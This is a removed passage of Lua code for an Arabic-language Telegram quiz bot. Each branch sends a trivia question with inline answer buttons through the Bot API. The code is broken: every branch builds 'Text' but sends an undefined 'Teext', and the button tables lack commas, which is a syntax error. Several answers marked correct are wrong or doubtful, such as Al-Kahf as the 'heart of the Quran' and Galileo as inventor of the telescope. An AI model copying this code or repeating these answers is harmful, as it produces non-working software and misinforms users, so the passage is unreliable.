-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel48" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel49"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel49" then
-local Text =[[
- • من هي الملكة التي ساعدت كولمبس على اكتشاف الولايات الأمريكية؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "إيزابيلا الأولى " callback_data="mel50"}},
-{{text = "إيزابيلا الثانيه " callback_data="✖"}},
-{{text = "إليزابيث " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel50" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel51"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel51" then
-local Text =[[
- • ما العنصر الغذائي الذي لا بوجد في الحليب؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الحديد " callback_data="mel52"}},
-{{text = "فيتامين c " callback_data="✖"}},
-{{text = "فيتامين A " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel52" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel53"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel53" then
-local Text =[[
- • كم عدد خلايا الدم التي يتمكن الجسم من إنتاجها في 24 ساعة؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "١٠٠ مليون خليه " callback_data="✖"}},
-{{text = "٢٠٠ مليون خليه " callback_data="mel54"}},
-{{text = "٣٠٠ مليون خليه " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel54" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel55"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel55" then
-local Text =[[
- • من هو الكائن البحري الذي يملك ثمانية ارجل؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "السلطعون " callback_data="✖"}},
-{{text = "قنديل البحر " callback_data="❌"}},
-{{text = "الاخطبوط " callback_data="mel56"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel56" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel57"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel57" then
-local Text =[[
-• ماهي السورة التي تشفع لقارئها يوم القيامه؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "سورة الفاتحة " callback_data="✖"}},
-{{text = "سورة البقرة" callback_data="❌"}},
-{{text = "سورة الملك" callback_data="mel58"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel58" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel59"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel59" then
-local Text =[[
-• أين تم افتتاح أول بنك للدم في العالم؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أوسلو " callback_data="✖"}},
-{{text = "نيويورك" callback_data="mel60"}},
-{{text = "باريس" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel60" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel61"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel61" then
-local Text =[[
- • المقصود بالتسنيم ؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "نهر في الجنه " callback_data="✖"}},
-{{text = "عين في الجنه" callback_data="mel62"}},
-{{text = "بيت في الجنه" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel62" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel63"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel63" then
-local Text =[[
-•ماهي السورة التي تسمى قلب القرآن؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الكهف " callback_data="mel64"}},
-{{text = "المائده " callback_data="✖"}},
-{{text = "البقره " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel64" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel65"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel65" then
-local Text =[[
-• ماهي السورة التي تسمى عروس القرآن؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "المجادله " callback_data="✖"}},
-{{text = "مريم " callback_data="❌"}},
-{{text = "الرحمن " callback_data="mel66"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel66" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel67"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel67" then
-local Text =[[
-• ماهي السورة التي كانت سببا في اسلام عمر بن الخطاب؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "طه " callback_data="mel68"}},
-{{text = "القلم " callback_data="✖"}},
-{{text = "يس " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel68" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel70"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel70" then
-local Text =[[
-• ماهي المعركه التي كانت سبب في جمع القرآن الكريم؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "اليمامه " callback_data="mel71"}},
-{{text = "الخندق " callback_data="✖"}},
-{{text = "القادسيه " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel71" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel72"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel72" then
-local Text =[[
-• ما هو الحيوان الذي إن تم قطع رجل من أرجله تنمو مجدداً؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الاخطبوط " callback_data="✖"}},
-{{text = "نجم البحر " callback_data="mel73"}},
-{{text = "العنكبوت " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel73" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel74"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel74" then
-local Text =[[
-• من هو اسرع طائر في العالم؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "النعامه" callback_data="mel75"}},
-{{text = "الصقر" callback_data="✖"}},
-{{text = "النسر " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel75" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel76"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel76" then
-local Text =[[
-• اسم أعلى هضبة بالكرة الأرضية؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "التبت " callback_data="mel77"}},
-{{text = "ادار" callback_data="✖"}},
-{{text = "عسير " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel77" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel78"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel78" then
-local Text =[[
-• ما هو اسم المضيق الذي يربط ما بين بحر مرمرة والبحر الأسود؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "كوك" callback_data="✖"}},
-{{text = "البسفور" callback_data="mel79"}},
-{{text = "كامون " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel79" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel80"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel80" then
-local Text =[[
-• كم عدد الجيوب الأنفية الموجودة داخل جسم الإنسان؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "سبعه" callback_data="✖"}},
-{{text = "ثمانية" callback_data="mel81"}},
-{{text = "أربعه " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel81" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel82"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel82" then
-local Text =[[
-• الاسم الذي تم إطلاقه على شعراء العصر الجاهلي الذين عاصروا الإسلام؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الادبيين" callback_data="✖"}},
-{{text = "المخضرمين" callback_data="mel83"}},
-{{text = "النبلاء " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel83" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel84"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-if Text == "mel84" then
-local Text =[[
-خلصت المستوى الثاني
-الحين وصلت المستوى الثالث
-عاش م بقالك كثير
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "ابدء المستوي الثالث " callback_data="mel85"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel85" then
-local Text =[[
-• اسم المعدن الأغلى سعراً؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الفرانسيوم" callback_data="✖"}},
-{{text = "الرديوم" callback_data="mel86"}},
-{{text = "الكاليفورنيوم " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel86" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel87"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel87" then
-local Text =[[
-• ما هي الدولة التي تحتل المساحة الأكبر في القارة الأفريقية؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "مصر" callback_data="✖"}},
-{{text = "الجزائر" callback_data="mel88"}},
-{{text = "السودان " callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel88" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel89"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel89" then
-local Text =[[
-• ما هي الدولة التي ولد فيها أبو علاء المعري؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "العراق" callback_data="✖"}},
-{{text = "اليمن " callback_data="❌"}},
-{{text = "سوريا" callback_data="mel90"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel90" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel92"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel92" then
-local Text =[[
-• الحمل هو صغير أي الحيوانات؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الناقه" callback_data="✖"}},
-{{text = "الحمار " callback_data="❌"}},
-{{text = "الخروف" callback_data="mel93"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel93" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel94"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel94" then
-local Text =[[
-• كم عدد العضلات التي يملكها الجراد؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "700 عضلة" callback_data="✖"}},
-{{text = "800 عضلة" callback_data="❌"}},
-{{text = "900 عضلة" callback_data="mel95"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel95" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel96"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel96" then
-local Text =[[
-• أين يوجد أكبر سوق للتمور في السعودية؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "القصيم " callback_data="✖"}},
-{{text = "بريده" callback_data="mel97"}},
-{{text = "عنيزة" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel97" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel98"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel98" then
-local Text =[[
-• من هو الشاعر الذي قتله شعره؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "امرؤ القيس " callback_data="✖"}},
-{{text = "المتنبي" callback_data="mel99"}},
-{{text = "عنتره" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel99" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel100"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel100" then
-local Text =[[
-• ما هي المادة التي يستخرج منها الفازلين؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "الزيت " callback_data="✖"}},
-{{text = "البترول" callback_data="❌"}},
-{{text = "النفط" callback_data="mel101"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel101" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel102"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel102" then
-local Text =[[
-• ماهو الشي الذي حرمه النبي صلى الله عليه وسلم على نفسه فعاتبه الله تعالى عليه؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "العسل" callback_data="mel103"}},
-{{text = "التمره " callback_data="✖"}},
-{{text = "التفاح" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel103" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel104"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel104" then
-local Text =[[
-• الجهاز الذي يستخدم في قياس الضغط الجوي؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "البانومتر " callback_data="✖"}},
-{{text = "البارومتر" callback_data="mel105"}},
-{{text = "الترمومتر" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel105" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel106"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel106" then
-local Text =[[
-• من هو العالم الذي اخترع التلسكوب ؟
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "جاليليو" callback_data="mel107"}},
-{{text = "غاليليو " callback_data="✖"}},
-{{text = "يوهانس" callback_data="❌"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel107" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel108"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel108" then
-local Text =[[
-• من هو الذي اخترع اول ماكينة حلاقه؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "فيرنر " callback_data="✖"}},
-{{text = "نيلز بورت" callback_data="❌"}},
-{{text = "كينج جيليت" callback_data="mel109"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel109" then
-local Text =[[
-أحسنت يا بطل 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "أكمل" callback_data="mel110"}},
-}
-return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
-end
-
-if Text == "mel110" then
-local Text =[[
-• من هو مخترع الالة الحاسبة؟ 
-]]
-keyboard = {} 
-keyboard.inline_keyboard = {
-{{text = "بليز باسكال" callback_data="mel111"}},
-{{text = "جاك كليبي " callback_data="✖"}},
-{{text = "تيكساس" callback_data="❌"}},
-}
